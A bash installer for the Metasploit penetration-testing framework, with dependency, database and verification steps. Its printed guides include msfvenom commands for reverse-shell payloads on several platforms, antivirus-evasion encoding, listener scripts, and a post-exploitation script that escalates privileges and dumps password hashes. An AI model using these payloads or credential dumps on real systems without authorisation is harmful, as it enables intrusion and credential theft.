#!/bin/bash

#====================================================================
#  METASPLOIT FRAMEWORK INSTALLATION SCRIPT
#====================================================================
#  Installs Metasploit Framework for penetration testing
#  
#  DISCLAIMER: Only use on systems you have authorization to test!
#====================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

INSTALL_DIR="$HOME/HackTools/exploitation/metasploit"

echo -e "${CYAN}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║           METASPLOIT FRAMEWORK INSTALLATION               ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

#====================================================================
# DETECT OS
#====================================================================
detect_os() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS=$ID
        VERSION=$VERSION_ID
    elif [[ -f /etc/debian_version ]]; then
        OS="debian"
    elif [[ -f /etc/redhat-release ]]; then
        OS="rhel"
    elif [[ "$(uname)" == "Darwin" ]]; then
        OS="macos"
    else
        OS="unknown"
    fi
    
    echo -e "${GREEN}[+] Detected OS: $OS${NC}"
}

#====================================================================
# INSTALL DEPENDENCIES
#====================================================================
install_dependencies() {
    echo -e "${YELLOW}[*] Installing dependencies...${NC}"
    
    case $OS in
        ubuntu|debian|kali)
            sudo apt-get update
            sudo apt-get install -y \
                curl wget gnupg2 \
                build-essential zlib1g-dev libssl-dev \
                libreadline-dev libyaml-dev libsqlite3-dev sqlite3 \
                libxml2-dev libxslt1-dev libcurl4-openssl-dev \
                libffi-dev libpq-dev postgresql postgresql-contrib \
                git autoconf bison libncurses5-dev
            ;;
        fedora|rhel|centos)
            sudo dnf install -y \
                curl wget gnupg2 \
                gcc gcc-c++ make zlib-devel openssl-devel \
                readline-devel libyaml-devel sqlite-devel \
                libxml2-devel libxslt-devel libcurl-devel \
                libffi-devel postgresql-devel postgresql postgresql-server \
                git autoconf bison ncurses-devel
            ;;
        arch|manjaro)
            sudo pacman -Syu --noconfirm \
                curl wget gnupg \
                base-devel zlib openssl \
                readline libyaml sqlite \
                libxml2 libxslt curl \
                libffi postgresql \
                git autoconf bison ncurses
            ;;
        macos)
            if ! command -v brew &> /dev/null; then
                echo -e "${RED}[-] Homebrew required. Install from https://brew.sh${NC}"
                exit 1
            fi
            brew install \
                curl wget gnupg \
                openssl readline libyaml sqlite \
                libxml2 libxslt libffi postgresql \
                git autoconf bison
            ;;
    esac
    
    echo -e "${GREEN}[+] Dependencies installed${NC}"
}

#====================================================================
# INSTALL METASPLOIT (Rapid7 Installer)
#====================================================================
install_metasploit_rapid7() {
    echo -e "${YELLOW}[*] Installing Metasploit via Rapid7 installer...${NC}"
    
    # Download installer
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
    
    chmod +x /tmp/msfinstall
    
    # Run installer
    /tmp/msfinstall
    
    rm /tmp/msfinstall
    
    echo -e "${GREEN}[+] Metasploit installed via Rapid7 installer${NC}"
}

#====================================================================
# INSTALL METASPLOIT (Package Manager)
#====================================================================
install_metasploit_package() {
    echo -e "${YELLOW}[*] Installing Metasploit via package manager...${NC}"
    
    case $OS in
        kali)
            sudo apt-get update
            sudo apt-get install -y metasploit-framework
            ;;
        ubuntu|debian)
            # Add Kali repo for metasploit
            echo -e "${YELLOW}[!] Adding Kali repository...${NC}"
            wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -
            echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" | sudo tee /etc/apt/sources.list.d/kali.list
            sudo apt-get update
            sudo apt-get install -y metasploit-framework
            ;;
        arch|manjaro)
            # Install from AUR
            if command -v yay &> /dev/null; then
                yay -S metasploit
            elif command -v paru &> /dev/null; then
                paru -S metasploit
            else
                echo -e "${YELLOW}[!] Please install yay or paru for AUR packages${NC}"
                echo "git clone https://aur.archlinux.org/yay.git && cd yay && makepkg -si"
            fi
            ;;
        macos)
            brew install metasploit
            ;;
        *)
            echo -e "${YELLOW}[!] Package manager install not supported for $OS${NC}"
            echo -e "${YELLOW}[!] Falling back to Rapid7 installer...${NC}"
            install_metasploit_rapid7
            ;;
    esac
    
    echo -e "${GREEN}[+] Metasploit installed${NC}"
}

#====================================================================
# INSTALL METASPLOIT (From Source)
#====================================================================
install_metasploit_source() {
    echo -e "${YELLOW}[*] Installing Metasploit from source...${NC}"
    
    mkdir -p "$INSTALL_DIR"
    
    # Install rbenv for Ruby management
    if ! command -v rbenv &> /dev/null; then
        echo -e "${BLUE}[>] Installing rbenv...${NC}"
        git clone https://github.com/rbenv/rbenv.git ~/.rbenv
        echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
        echo 'eval "$(rbenv init -)"' >> ~/.bashrc
        export PATH="$HOME/.rbenv/bin:$PATH"
        eval "$(rbenv init -)"
        
        # Install ruby-build
        git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build
    fi
    
    # Install Ruby
    RUBY_VERSION="3.1.4"
    echo -e "${BLUE}[>] Installing Ruby $RUBY_VERSION...${NC}"
    rbenv install $RUBY_VERSION 2>/dev/null || true
    rbenv global $RUBY_VERSION
    
    # Clone Metasploit
    echo -e "${BLUE}[>] Cloning Metasploit repository...${NC}"
    if [[ ! -d "$INSTALL_DIR/metasploit-framework" ]]; then
        git clone https://github.com/rapid7/metasploit-framework.git "$INSTALL_DIR/metasploit-framework"
    else
        cd "$INSTALL_DIR/metasploit-framework"
        git pull
    fi
    
    cd "$INSTALL_DIR/metasploit-framework"
    
    # Install gems
    echo -e "${BLUE}[>] Installing Ruby gems...${NC}"
    gem install bundler
    bundle install
    
    # Create symlinks
    echo -e "${BLUE}[>] Creating symlinks...${NC}"
    sudo ln -sf "$INSTALL_DIR/metasploit-framework/msfconsole" /usr/local/bin/msfconsole
    sudo ln -sf "$INSTALL_DIR/metasploit-framework/msfvenom" /usr/local/bin/msfvenom
    sudo ln -sf "$INSTALL_DIR/metasploit-framework/msfrpcd" /usr/local/bin/msfrpcd
    sudo ln -sf "$INSTALL_DIR/metasploit-framework/msfdb" /usr/local/bin/msfdb
    
    echo -e "${GREEN}[+] Metasploit installed from source${NC}"
}

#====================================================================
# SETUP DATABASE
#====================================================================
setup_database() {
    echo -e "${YELLOW}[*] Setting up PostgreSQL database...${NC}"
    
    # Start PostgreSQL
    case $OS in
        ubuntu|debian|kali)
            sudo systemctl start postgresql
            sudo systemctl enable postgresql
            ;;
        fedora|rhel|centos)
            sudo postgresql-setup --initdb 2>/dev/null || true
            sudo systemctl start postgresql
            sudo systemctl enable postgresql
            ;;
        arch|manjaro)
            sudo -u postgres initdb -D /var/lib/postgres/data 2>/dev/null || true
            sudo systemctl start postgresql
            sudo systemctl enable postgresql
            ;;
        macos)
            brew services start postgresql
            ;;
    esac
    
    # Initialize Metasploit database
    echo -e "${BLUE}[>] Initializing Metasploit database...${NC}"
    msfdb init 2>/dev/null || {
        echo -e "${YELLOW}[!] msfdb init failed. Try manually:${NC}"
        echo "  sudo -u postgres createuser msf -S -R -D"
        echo "  sudo -u postgres createdb -O msf msf"
        echo "  msfdb reinit"
    }
    
    echo -e "${GREEN}[+] Database setup complete${NC}"
}

#====================================================================
# VERIFY INSTALLATION
#====================================================================
verify_installation() {
    echo -e "${YELLOW}[*] Verifying installation...${NC}"
    
    if command -v msfconsole &> /dev/null; then
        echo -e "${GREEN}[+] msfconsole: $(which msfconsole)${NC}"
    else
        echo -e "${RED}[-] msfconsole not found${NC}"
    fi
    
    if command -v msfvenom &> /dev/null; then
        echo -e "${GREEN}[+] msfvenom: $(which msfvenom)${NC}"
    else
        echo -e "${RED}[-] msfvenom not found${NC}"
    fi
    
    # Check database connection
    echo -e "${BLUE}[>] Checking database connection...${NC}"
    msfdb status 2>/dev/null || echo -e "${YELLOW}[!] Database status check failed${NC}"
}

#====================================================================
# SHOW USAGE GUIDE
#====================================================================
show_usage_guide() {
    echo -e "${CYAN}"
    echo "═══════════════════════════════════════════════════════════"
    echo "  METASPLOIT USAGE GUIDE"
    echo "═══════════════════════════════════════════════════════════"
    echo -e "${NC}"
    echo ""
    echo "BASIC COMMANDS:"
    echo "  msfconsole              # Start Metasploit console"
    echo "  msfvenom                # Payload generator"
    echo "  msfdb                   # Database management"
    echo ""
    echo "CONSOLE BASICS:"
    echo "  help                    # Show help"
    echo "  search <term>           # Search for modules"
    echo "  use <module>            # Select a module"
    echo "  show options            # Show module options"
    echo "  set <option> <value>    # Set option value"
    echo "  run / exploit           # Execute the module"
    echo "  back                    # Go back"
    echo "  sessions                # List active sessions"
    echo ""
    echo "DATABASE COMMANDS:"
    echo "  db_status               # Check database connection"
    echo "  workspace               # Manage workspaces"
    echo "  hosts                   # List discovered hosts"
    echo "  services                # List discovered services"
    echo "  vulns                   # List vulnerabilities"
    echo "  creds                   # List credentials"
    echo ""
    echo "EXAMPLE WORKFLOW:"
    echo "  1. msfconsole"
    echo "  2. db_status"
    echo "  3. workspace -a target_name"
    echo "  4. db_nmap -sV -sC target_ip"
    echo "  5. search type:exploit platform:linux"
    echo "  6. use exploit/multi/handler"
    echo "  7. set payload linux/x64/meterpreter/reverse_tcp"
    echo "  8. set LHOST your_ip"
    echo "  9. run"
    echo ""
}

#====================================================================
# SHOW MSFVENOM GUIDE
#====================================================================
show_msfvenom_guide() {
    echo -e "${CYAN}"
    echo "═══════════════════════════════════════════════════════════"
    echo "  MSFVENOM PAYLOAD GENERATION GUIDE"
    echo "═══════════════════════════════════════════════════════════"
    echo -e "${NC}"
    echo ""
    echo "LIST PAYLOADS:"
    echo "  msfvenom -l payloads              # List all payloads"
    echo "  msfvenom -l encoders              # List encoders"
    echo "  msfvenom -l formats               # List output formats"
    echo ""
    echo "COMMON PAYLOADS:"
    echo ""
    echo "# Windows Reverse Shell"
    echo "msfvenom -p windows/x64/meterpreter/reverse_tcp \\"
    echo "    LHOST=<IP> LPORT=<PORT> -f exe > shell.exe"
    echo ""
    echo "# Linux Reverse Shell"
    echo "msfvenom -p linux/x64/meterpreter/reverse_tcp \\"
    echo "    LHOST=<IP> LPORT=<PORT> -f elf > shell.elf"
    echo ""
    echo "# PHP Reverse Shell"
    echo "msfvenom -p php/meterpreter/reverse_tcp \\"
    echo "    LHOST=<IP> LPORT=<PORT> -f raw > shell.php"
    echo ""
    echo "# Python Reverse Shell"
    echo "msfvenom -p python/meterpreter/reverse_tcp \\"
    echo "    LHOST=<IP> LPORT=<PORT> -f raw > shell.py"
    echo ""
    echo "# Java WAR file"
    echo "msfvenom -p java/jsp_shell_reverse_tcp \\"
    echo "    LHOST=<IP> LPORT=<PORT> -f war > shell.war"
    echo ""
    echo "# Android APK"
    echo "msfvenom -p android/meterpreter/reverse_tcp \\"
    echo "    LHOST=<IP> LPORT=<PORT> -o shell.apk"
    echo ""
    echo "# Shellcode (for buffer overflow)"
    echo "msfvenom -p windows/x64/shell_reverse_tcp \\"
    echo "    LHOST=<IP> LPORT=<PORT> -f c -b '\\x00'"
    echo ""
    echo "ENCODING (AV Evasion):"
    echo "  -e x86/shikata_ga_nai    # Popular encoder"
    echo "  -i 5                     # Iterations"
    echo "  -b '\\x00\\x0a'            # Bad characters"
    echo ""
}

#====================================================================
# CREATE RESOURCE SCRIPTS
#====================================================================
create_resource_scripts() {
    echo -e "${YELLOW}[*] Creating resource scripts...${NC}"
    
    mkdir -p "$HOME/HackTools/exploitation/msf-resources"
    RESOURCE_DIR="$HOME/HackTools/exploitation/msf-resources"
    
    # Multi/handler for reverse shells
    cat > "$RESOURCE_DIR/handler-tcp.rc" << 'EOF'
# Metasploit Handler for Reverse TCP Shells
# Usage: msfconsole -r handler-tcp.rc

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

    # HTTP handler
    cat > "$RESOURCE_DIR/handler-http.rc" << 'EOF'
# Metasploit Handler for HTTP Shells
# Usage: msfconsole -r handler-http.rc

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_http
set LHOST 0.0.0.0
set LPORT 8080
set ExitOnSession false
exploit -j
EOF

    # Database scanning automation
    cat > "$RESOURCE_DIR/db-scan.rc" << 'EOF'
# Database-integrated Nmap scanning
# Usage: msfconsole -r db-scan.rc
# Set RHOSTS before running

db_nmap -sV -sC -O -A <RHOSTS>
services
vulns
EOF

    # Post-exploitation info gathering
    cat > "$RESOURCE_DIR/post-enum.rc" << 'EOF'
# Post-exploitation enumeration
# Run from active Meterpreter session

sysinfo
getuid
getsystem
hashdump
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_system
run post/multi/recon/local_exploit_suggester
EOF

    echo -e "${GREEN}[+] Resource scripts created in: $RESOURCE_DIR${NC}"
    echo ""
    echo "Usage: msfconsole -r $RESOURCE_DIR/<script>.rc"
}

#====================================================================
# MAIN MENU
#====================================================================
show_menu() {
    echo ""
    echo "Select installation method:"
    echo ""
    echo "  1) Install via Package Manager (recommended for Kali)"
    echo "  2) Install via Rapid7 Installer (recommended for others)"
    echo "  3) Install from Source"
    echo "  4) Setup/Reinitialize Database only"
    echo "  5) Verify Installation"
    echo "  6) Show Usage Guide"
    echo "  7) Show msfvenom Guide"
    echo "  8) Create Resource Scripts"
    echo "  9) Full Setup (install + database + scripts)"
    echo "  0) Exit"
    echo ""
    read -p "Enter choice [0-9]: " choice
    
    case $choice in
        1)
            detect_os
            install_dependencies
            install_metasploit_package
            setup_database
            verify_installation
            ;;
        2)
            detect_os
            install_dependencies
            install_metasploit_rapid7
            setup_database
            verify_installation
            ;;
        3)
            detect_os
            install_dependencies
            install_metasploit_source
            setup_database
            verify_installation
            ;;
        4)
            detect_os
            setup_database
            ;;
        5)
            verify_installation
            ;;
        6)
            show_usage_guide
            ;;
        7)
            show_msfvenom_guide
            ;;
        8)
            create_resource_scripts
            ;;
        9)
            detect_os
            install_dependencies
            install_metasploit_package
            setup_database
            create_resource_scripts
            verify_installation
            show_usage_guide
            ;;
        0)
            exit 0
            ;;
        *)
            echo "Invalid choice"
            show_menu
            ;;
    esac
}

#====================================================================
# RUN
#====================================================================
if [[ "$1" == "--auto" ]]; then
    detect_os
    install_dependencies
    install_metasploit_package
    setup_database
    create_resource_scripts
    verify_installation
elif [[ "$1" == "--help" ]]; then
    echo "Usage: $0 [--auto|--help]"
    echo "  --auto   : Automatic installation"
    echo "  --help   : Show this help"
    echo "  (no args): Interactive menu"
else
    show_menu
fi

echo ""
echo -e "${GREEN}[+] Done!${NC}"
echo -e "${YELLOW}[!] Remember: Only use Metasploit on authorized systems!${NC}"
